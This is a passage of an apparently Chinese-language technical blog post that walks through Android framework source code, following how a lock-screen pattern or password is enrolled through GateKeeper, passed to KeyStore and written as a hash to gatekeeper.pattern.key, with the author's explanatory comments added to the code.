class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">1014</span>              <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="number">1015</span>          &#125;</span><br><span class="line"><span class="number">1016</span>          <span class="keyword">final</span> <span class="type">int</span> <span class="variable">patternSize</span> <span class="operator">=</span> pattern.size();</span><br><span class="line"><span class="number">1017</span>  </span><br><span class="line"><span class="number">1018</span>          <span class="type">byte</span>[] res = <span class="keyword">new</span> <span class="title class_">byte</span>[patternSize];</span><br><span class="line"><span class="number">1019</span>          <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; patternSize; i++) &#123;</span><br><span class="line"><span class="number">1020</span>              LockPatternView.<span class="type">Cell</span> <span class="variable">cell</span> <span class="operator">=</span> pattern.get(i);</span><br><span class="line"><span class="number">1021</span>              res[i] = (<span class="type">byte</span>) (cell.getRow() * <span class="number">3</span> + cell.getColumn() + <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="number">1022</span>          &#125;</span><br><span class="line"><span class="number">1023</span>          <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(res);</span><br><span class="line"><span class="number">1024</span>      &#125;</span><br></pre></td></tr></table></figure><h2 id="3-3-setLockCredential"><a href="#3-3-setLockCredential" class="headerlink" title="3.3 setLockCredential()"></a>3.3 setLockCredential()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/services/core/java/com/android/server/locksettings/LockSettingsService.java</span></span><br><span class="line"><span class="number">1217</span>      <span class="comment">// This method should be called by LockPatternUtil only, all internal methods in this class</span></span><br><span class="line"><span class="number">1218</span>      <span class="comment">// should call setLockCredentialInternal.</span></span><br><span class="line"><span class="number">1219</span>      <span class="meta">@Override</span></span><br><span class="line"><span class="number">1220</span>      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLockCredential</span><span class="params">(String credential, <span class="type">int</span> type, String savedCredential,</span></span><br><span class="line"><span class="params"><span class="number">1221</span>              <span class="type">int</span> requestedQuality, <span class="type">int</span> userId)</span></span><br><span class="line"><span class="number">1222</span>              <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"><span class="number">1223</span>          checkWritePermission(userId);</span><br><span class="line"><span class="number">1224</span>          <span class="keyword">synchronized</span> (mSeparateChallengeLock) &#123;</span><br><span class="line"><span class="number">1225</span>              setLockCredentialInternal(credential, type, savedCredential, requestedQuality, userId);</span><br><span class="line"><span class="number">1226</span>              setSeparateProfileChallengeEnabled(userId, <span class="literal">true</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="number">1227</span>              notifyPasswordChanged(userId);<span class="comment">//通知用户密码已更改</span></span><br><span class="line"><span class="number">1228</span>          &#125;</span><br><span class="line"><span class="number">1229</span>      &#125;</span><br></pre></td></tr></table></figure><h2 id="3-4-setLockCredentialInternal"><a href="#3-4-setLockCredentialInternal" class="headerlink" title="3.4 setLockCredentialInternal()"></a>3.4 setLockCredentialInternal()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/services/core/java/com/android/server/locksettings/LockSettingsService.java</span></span><br><span class="line"><span class="number">1231</span>      <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setLockCredentialInternal</span><span class="params">(String credential, <span class="type">int</span> credentialType,</span></span><br><span class="line"><span class="params"><span class="number">1232</span>              String savedCredential, <span class="type">int</span> requestedQuality, <span class="type">int</span> userId)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">1298</span>          <span class="keyword">if</span> (DEBUG) Slog.d(TAG, <span class="string">&quot;setLockCredentialInternal: user=&quot;</span> + userId);</span><br><span class="line"><span class="number">1299</span>          <span class="type">byte</span>[] enrolledHandle = enrollCredential(currentHandle.hash, savedCredential, credential,</span><br><span class="line"><span class="number">1300</span>                  userId);<span class="comment">//注册凭据，返回密文数组</span></span><br><span class="line"><span class="number">1301</span>          <span class="keyword">if</span> (enrolledHandle != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">1302</span>              <span class="type">CredentialHash</span> <span class="variable">willStore</span> <span class="operator">=</span> CredentialHash.create(enrolledHandle, credentialType);</span><br><span class="line"><span class="number">1303</span>              mStorage.writeCredentialHash(willStore, userId);<span class="comment">//存储hash</span></span><br><span class="line"><span class="number">1304</span>              <span class="comment">// push new secret and auth token to vold</span></span><br><span class="line"><span class="number">1305</span>              <span class="type">GateKeeperResponse</span> <span class="variable">gkResponse</span> <span class="operator">=</span> getGateKeeperService()</span><br><span class="line"><span class="number">1306</span>                      .verifyChallenge(userId, <span class="number">0</span>, willStore.hash, credential.getBytes());<span class="comment">//验证willStore.hash与GateKeeperService返回的请求payload是否一致</span></span><br><span class="line"><span class="number">1307</span>              setUserKeyProtection(userId, credential, convertResponse(gkResponse));</span><br><span class="line"><span class="number">1308</span>              fixateNewestUserKeyAuth(userId);</span><br><span class="line"><span class="number">1309</span>              <span class="comment">// Refresh the auth token</span></span><br><span class="line"><span class="number">1310</span>              doVerifyCredential(credential, credentialType, <span class="literal">true</span>, <span class="number">0</span>, userId, <span class="literal">null</span> <span class="comment">/* progressCallback */</span>);</span><br><span class="line"><span class="number">1311</span>              synchronizeUnifiedWorkChallengeForProfiles(userId, <span class="literal">null</span>);</span><br><span class="line"><span class="number">1312</span>          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">1313</span>              <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RemoteException</span>(<span class="string">&quot;Failed to enroll &quot;</span> +</span><br><span class="line"><span class="number">1314</span>                      (credentialType == LockPatternUtils.CREDENTIAL_TYPE_PASSWORD ? <span class="string">&quot;password&quot;</span></span><br><span class="line"><span class="number">1315</span>                              : <span class="string">&quot;pattern&quot;</span>));</span><br><span class="line"><span class="number">1316</span>          &#125;</span><br><span class="line"><span class="number">1317</span>      &#125;</span><br></pre></td></tr></table></figure><h2 id="3-5-enrollCredential"><a href="#3-5-enrollCredential" class="headerlink" title="3.5 enrollCredential()"></a>3.5 enrollCredential()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/services/core/java/com/android/server/locksettings/LockSettingsService.java</span></span><br><span class="line"><span class="number">1384</span>      <span class="keyword">private</span> <span class="type">byte</span>[] enrollCredential(<span class="type">byte</span>[] enrolledHandle,</span><br><span class="line"><span class="number">1385</span>              String enrolledCredential, String toEnroll, <span class="type">int</span> userId)</span><br><span class="line"><span class="number">1386</span>              <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"><span class="number">1387</span>          checkWritePermission(userId);</span><br><span class="line"><span class="number">1388</span>          <span class="type">byte</span>[] enrolledCredentialBytes = enrolledCredential == <span class="literal">null</span></span><br><span class="line"><span class="number">1389</span>                  ? <span class="literal">null</span></span><br><span class="line"><span class="number">1390</span>                  : enrolledCredential.getBytes();</span><br><span class="line"><span class="number">1391</span>          <span class="type">byte</span>[] toEnrollBytes = toEnroll == <span class="literal">null</span></span><br><span class="line"><span class="number">1392</span>                  ? <span class="literal">null</span></span><br><span class="line"><span class="number">1393</span>                  : toEnroll.getBytes();<span class="comment">//输入字符串转换成字节数组</span></span><br><span class="line"><span class="number">1394</span>          <span class="type">GateKeeperResponse</span> <span class="variable">response</span> <span class="operator">=</span> getGateKeeperService().enroll(userId, enrolledHandle,</span><br><span class="line"><span class="number">1395</span>                  enrolledCredentialBytes, toEnrollBytes);<span class="comment">//启动GateKeeperService服务，返回响应请求</span></span><br><span class="line"><span class="number">1396</span>  </span><br><span class="line"><span class="number">1397</span>          <span class="keyword">if</span> (response == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">1398</span>              <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"><span class="number">1399</span>          &#125;</span><br><span class="line"><span class="number">1400</span>  </span><br><span class="line"><span class="number">1401</span>          <span class="type">byte</span>[] hash = response.getPayload();<span class="comment">//响应中的payload就是明文加密后的密文数组</span></span><br><span class="line"><span class="number">1402</span>          <span class="keyword">if</span> (hash != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">1403</span>              setKeystorePassword(toEnroll, userId);<span class="comment">//将明文字节数组存入Keystore</span></span><br><span class="line"><span class="number">1404</span>          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">1405</span>              <span class="comment">// Should not happen</span></span><br><span class="line"><span class="number">1406</span>              Slog.e(TAG, <span class="string">&quot;Throttled while enrolling a password&quot;</span>);</span><br><span class="line"><span class="number">1407</span>          &#125;</span><br><span class="line"><span class="number">1408</span>          <span class="keyword">return</span> hash;<span class="comment">//返回密文数组</span></span><br><span class="line"><span class="number">1409</span>      &#125;</span><br></pre></td></tr></table></figure><h2 id="3-6-enroll"><a href="#3-6-enroll" class="headerlink" title="3.6 enroll()"></a>3.6 enroll()</h2><p>这里如何注册，给了一个接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/core/java/android/service/gatekeeper/IGateKeeperService.aidl</span></span><br><span class="line"><span class="number">31</span>      <span class="comment">/**</span></span><br><span class="line"><span class="comment">32       * Enrolls a password, returning the handle to the enrollment to be stored locally.</span></span><br><span class="line"><span class="comment">33       * <span class="doctag">@param</span> uid The Android user ID associated to this enrollment</span></span><br><span class="line"><span class="comment">34       * <span class="doctag">@param</span> currentPasswordHandle The previously enrolled handle, or null if none</span></span><br><span class="line"><span class="comment">35       * <span class="doctag">@param</span> currentPassword The previously enrolled plaintext password, or null if none.</span></span><br><span class="line"><span class="comment">36       *                        If provided, must verify against the currentPasswordHandle.</span></span><br><span class="line"><span class="comment">37       * <span class="doctag">@param</span> desiredPassword The new desired password, for which a handle will be returned</span></span><br><span class="line"><span class="comment">38       *                        upon success.</span></span><br><span class="line"><span class="comment">39       * <span class="doctag">@return</span> an EnrollResponse or null on failure</span></span><br><span class="line"><span class="comment">40       */</span></span><br><span class="line"><span class="number">41</span>      GateKeeperResponse <span class="title function_">enroll</span><span class="params">(<span class="type">int</span> uid, in <span class="type">byte</span>[] currentPasswordHandle, in <span class="type">byte</span>[] currentPassword,</span></span><br><span class="line"><span class="params"><span class="number">42</span>              in <span class="type">byte</span>[] desiredPassword)</span>;</span><br></pre></td></tr></table></figure><h2 id="3-7-setKeystorePassword"><a href="#3-7-setKeystorePassword" class="headerlink" title="3.7 setKeystorePassword()"></a>3.7 setKeystorePassword()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/services/core/java/com/android/server/locksettings/LockSettingsService.java</span></span><br><span class="line"><span class="number">1016</span>      <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setKeystorePassword</span><span class="params">(String password, <span class="type">int</span> userHandle)</span> &#123;</span><br><span class="line"><span class="number">1017</span>          <span class="keyword">final</span> <span class="type">KeyStore</span> <span class="variable">ks</span> <span class="operator">=</span> KeyStore.getInstance();</span><br><span class="line"><span class="number">1018</span>          ks.onUserPasswordChanged(userHandle, password);</span><br><span class="line"><span class="number">1019</span>      &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/keystore/java/android/security/KeyStore.java</span></span><br><span class="line"><span class="number">575</span>      <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onUserPasswordChanged</span><span class="params">(<span class="type">int</span> userId, String newPassword)</span> &#123;</span><br><span class="line"><span class="number">576</span>          <span class="comment">// Parcel.cpp doesn&#x27;t support deserializing null strings and treats them as &quot;&quot;. Make that</span></span><br><span class="line"><span class="number">577</span>          <span class="comment">// explicit here.</span></span><br><span class="line"><span class="number">578</span>          <span class="keyword">if</span> (newPassword == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">579</span>              newPassword = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="number">580</span>          &#125;</span><br><span class="line"><span class="number">581</span>          <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">582</span>              <span class="keyword">return</span> mBinder.onUserPasswordChanged(userId, newPassword) == NO_ERROR;<span class="comment">//这里又是一个接口</span></span><br><span class="line"><span class="number">583</span>          &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line"><span class="number">584</span>              Log.w(TAG, <span class="string">&quot;Cannot connect to keystore&quot;</span>, e);</span><br><span class="line"><span class="number">585</span>              <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">586</span>          &#125;</span><br><span class="line"><span class="number">587</span>      &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/core/java/android/security/IKeystoreService.aidl</span></span><br><span class="line"><span class="number">41</span>      <span class="type">int</span> <span class="title function_">onUserPasswordChanged</span><span class="params">(<span class="type">int</span> userId, String newPassword)</span>;</span><br></pre></td></tr></table></figure><h2 id="3-8-create"><a href="#3-8-create" class="headerlink" title="3.8 create()"></a>3.8 create()</h2><p>注册完凭据，继续<code>setLockCredentialInternal()</code>往下执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">124</span>          <span class="keyword">static</span> CredentialHash <span class="title function_">create</span><span class="params">(<span class="type">byte</span>[] hash, <span class="type">int</span> type)</span> &#123;</span><br><span class="line"><span class="number">125</span>              <span class="keyword">if</span> (type == LockPatternUtils.CREDENTIAL_TYPE_NONE) &#123;</span><br><span class="line"><span class="number">126</span>                  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Bad type for CredentialHash&quot;</span>);</span><br><span class="line"><span class="number">127</span>              &#125;</span><br><span class="line"><span class="number">128</span>              <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CredentialHash</span>(hash, type, VERSION_GATEKEEPER);</span><br><span class="line"><span class="number">129</span>          &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">97</span>          <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">VERSION_GATEKEEPER</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">99</span>          <span class="keyword">private</span> <span class="title function_">CredentialHash</span><span class="params">(<span class="type">byte</span>[] hash, <span class="type">int</span> type, <span class="type">int</span> version)</span> &#123;</span><br><span class="line"><span class="number">100</span>              <span class="built_in">this</span>(hash, type, version, <span class="literal">false</span> <span class="comment">/* isBaseZeroPattern */</span>);</span><br><span class="line"><span class="number">101</span>          &#125;</span><br><span class="line"><span class="number">102</span>  </span><br><span class="line"><span class="number">103</span>          <span class="keyword">private</span> <span class="title function_">CredentialHash</span><span class="params">(<span class="type">byte</span>[] hash, <span class="type">int</span> type, <span class="type">int</span> version, <span class="type">boolean</span> isBaseZeroPattern)</span> &#123;</span><br><span class="line"><span class="number">104</span>              <span class="keyword">if</span> (type != LockPatternUtils.CREDENTIAL_TYPE_NONE) &#123;</span><br><span class="line"><span class="number">105</span>                  <span class="keyword">if</span> (hash == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">106</span>                      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Empty hash for CredentialHash&quot;</span>);</span><br><span class="line"><span class="number">107</span>                  &#125;</span><br><span class="line"><span class="number">108</span>              &#125; <span class="keyword">else</span> <span class="comment">/* type == LockPatternUtils.CREDENTIAL_TYPE_NONE */</span> &#123;</span><br><span class="line"><span class="number">109</span>                  <span class="keyword">if</span> (hash != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">110</span>                      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;None type CredentialHash should not have hash&quot;</span>);</span><br><span class="line"><span class="number">111</span>                  &#125;</span><br><span class="line"><span class="number">112</span>              &#125;</span><br><span class="line"><span class="number">113</span>              <span class="built_in">this</span>.hash = hash;</span><br><span class="line"><span class="number">114</span>              <span class="built_in">this</span>.type = type;</span><br><span class="line"><span class="number">115</span>              <span class="built_in">this</span>.version = version;</span><br><span class="line"><span class="number">116</span>              <span class="built_in">this</span>.isBaseZeroPattern = isBaseZeroPattern;</span><br><span class="line"><span class="number">117</span>          &#125;</span><br></pre></td></tr></table></figure><h2 id="3-9-writeCredentialHash"><a href="#3-9-writeCredentialHash" class="headerlink" title="3.9 writeCredentialHash()"></a>3.9 writeCredentialHash()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/services/core/java/com/android/server/locksettings/LockSettingsStorage.java</span></span><br><span class="line"><span class="number">433</span>      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeCredentialHash</span><span class="params">(CredentialHash hash, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">434</span>          <span class="type">byte</span>[] patternHash = <span class="literal">null</span>;</span><br><span class="line"><span class="number">435</span>          <span class="type">byte</span>[] passwordHash = <span class="literal">null</span>;</span><br><span class="line"><span class="number">436</span>  </span><br><span class="line"><span class="number">437</span>          <span class="keyword">if</span> (hash.type == LockPatternUtils.CREDENTIAL_TYPE_PASSWORD) &#123;</span><br><span class="line"><span class="number">438</span>              passwordHash = hash.hash;</span><br><span class="line"><span class="number">439</span>          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (hash.type == LockPatternUtils.CREDENTIAL_TYPE_PATTERN) &#123;</span><br><span class="line"><span class="number">440</span>              patternHash = hash.hash;</span><br><span class="line"><span class="number">441</span>          &#125;</span><br><span class="line"><span class="number">442</span>          writeFile(getLockPasswordFilename(userId), passwordHash);</span><br><span class="line"><span class="number">443</span>          writeFile(getLockPatternFilename(userId), patternHash);</span><br><span class="line"><span class="number">444</span>      &#125;</span><br><span class="line"><span class="number">445</span></span><br><span class="line"><span class="number">446</span>      <span class="meta">@VisibleForTesting</span></span><br><span class="line"><span class="number">447</span>      String <span class="title function_">getLockPatternFilename</span><span class="params">(<span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">448</span>          <span class="keyword">return</span> getLockCredentialFilePathForUser(userId, LOCK_PATTERN_FILE);</span><br><span class="line"><span class="number">449</span>      &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">76</span>      <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LOCK_PATTERN_FILE</span> <span class="operator">=</span> <span class="string">&quot;gatekeeper.pattern.key&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">475</span>      <span class="keyword">private</span> String <span class="title function_">getLockCredentialFilePathForUser</span><span class="params">(<span class="type">int</span> userId, String basename)</span> &#123;</span><br><span class="line"><span class="number">476</span>          <span class="type">String</span> <span class="variable">dataSystemDirectory</span> <span class="operator">=</span> Environment.getDataDirectory().getAbsolutePath() +</span><br><span class="line"><span class="number">477</span>                          SYSTEM_DIRECTORY;</span><br><span class="line"><span class="number">478</span>          <span class="keyword">if</span> (userId == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">479</span>              <span class="comment">// Leave it in the same place for user 0</span></span><br><span class="line"><span class="comment">// /data/system/gatekeeper.pattern.key</span></span><br><span class="line"><span class="number">480</span>              <span class="keyword">return</span> dataSystemDirectory + basename;</span><br><span class="line"><span class="number">481</span>          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">482</span>              <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">File</span>(Environment.getUserSystemDirectory(userId), basename).getAbsolutePath();</span><br><span class="line"><span class="number">483</span>          &#125;</span><br><span class="line"><span class="number">484</span>      &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">75</span>      <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SYSTEM_DIRECTORY</span> <span class="operator">=</span> <span class="string">&quot;/system/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">391</span>      <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(String name, <span class="type">byte</span>[] hash)</span> &#123;</span><br><span class="line"><span class="number">392</span>          <span class="keyword">synchronized</span> (mFileWriteLock) &#123;</span><br><span class="line"><span class="number">393</span>              <span class="type">RandomAccessFile</span> <span class="variable">raf</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="number">394</span>              <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">395</span>                  <span class="comment">// Write the hash to file, requiring each write to be synchronized to the</span></span><br><span class="line"><span class="number">396</span>                  <span class="comment">// underlying storage device immediately to avoid data loss in case of power loss.</span></span><br><span class="line"><span class="number">397</span>                  <span class="comment">// This also ensures future secdiscard operation on the file succeeds since the</span></span><br><span class="line"><span class="number">398</span>                  <span class="comment">// file would have been allocated on flash.</span></span><br><span class="line"><span class="number">399</span>                  raf = <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(name, <span class="string">&quot;rws&quot;</span>);</span><br><span class="line"><span class="number">400</span>                  <span class="comment">// Truncate the file if pattern is null, to clear the lock</span></span><br><span class="line"><span class="number">401</span>                  <span class="keyword">if</span> (hash == <span class="literal">null</span> || hash.length == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">402</span>                      raf.setLength(<span class="number">0</span>);</span><br><span class="line"><span class="number">403</span>                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">404</span>                      raf.write(hash, <span class="number">0</span>, hash.length);</span><br><span class="line"><span class="number">405</span>                  &#125;</span><br><span class="line"><span class="number">406</span>                  raf.close();</span><br><span class="line"><span class="number">407</span>              &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"><span class="number">408</span>                  Slog.e(TAG, <span class="string">&quot;Error writing to file &quot;</span> + e);</span><br><span class="line"><span class="number">409</span>              &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="number">410</span>                  <span class="keyword">if</span> (raf != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">411</span>                      <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">412</span>                          raf.close();</span><br><span class="line"><span class="number">413</span>                      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"><span class="number">414</span>                          Slog.e(TAG, <span class="string">&quot;Error closing file &quot;</span> + e);</span><br><span class="line"><span class="number">415</span>                      &#125;</span><br><span class="line"><span class="number">416</span>                  &#125;</span><br><span class="line"><span class="number">417</span>              &#125;</span><br><span class="line"><span class="number">418</span>              mCache.putFile(name, hash);</span><br><span class="line"><span class="number">419</span>          &#125;</span><br><span class="line"><span class="number">420</span>      &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">806</span>          <span class="keyword">void</span> <span class="title function_">putFile</span><span class="params">(String key, <span class="type">byte</span>[] value)</span> &#123;</span><br><span class="line"><span class="number">807</span>              put(CacheKey.TYPE_FILE, key, value, -<span class="number">1</span> <span class="comment">/* userId */</span>);</span><br><span class="line"><span class="number">808</span>          &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">876</span>              <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">TYPE_FILE</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">823</span>          <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> type, String key, Object value, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">824</span>              <span class="comment">// Create a new CachKey here because it may be saved in the map if the key is absent.</span></span><br><span class="line"><span class="number">825</span>              mCache.put(<span class="keyword">new</span> <span class="title class_">CacheKey</span>().set(type, key, userId), value);</span><br><span class="line"><span class="number">826</span>              mVersion++;</span><br><span class="line"><span class="number">827</span>          &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">883</span>              <span class="keyword">public</span> CacheKey <span class="title function_">set</span><span class="params">(<span class="type">int</span> type, String key, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">884</span>                  <span class="built_in">this</span>.type = type;</span><br><span class="line"><span class="number">885</span>                  <span class="built_in">this</span>.key = key;</span><br><span class="line"><span class="number">886</span>                  <span class="built_in">this</span>.userId = userId;</span><br><span class="line"><span class="number">887</span>                  <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line"><span class="number">888</span>              &#125;</span><br></pre></td></tr></table></figure><p>继续返回<code>setLockCredentialInternal()</code>。</p><h2 id="3-10-verifyChallenge"><a href="#3-10-verifyChallenge" class="headerlink" title="3.10 verifyChallenge()"></a>3.10 verifyChallenge()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 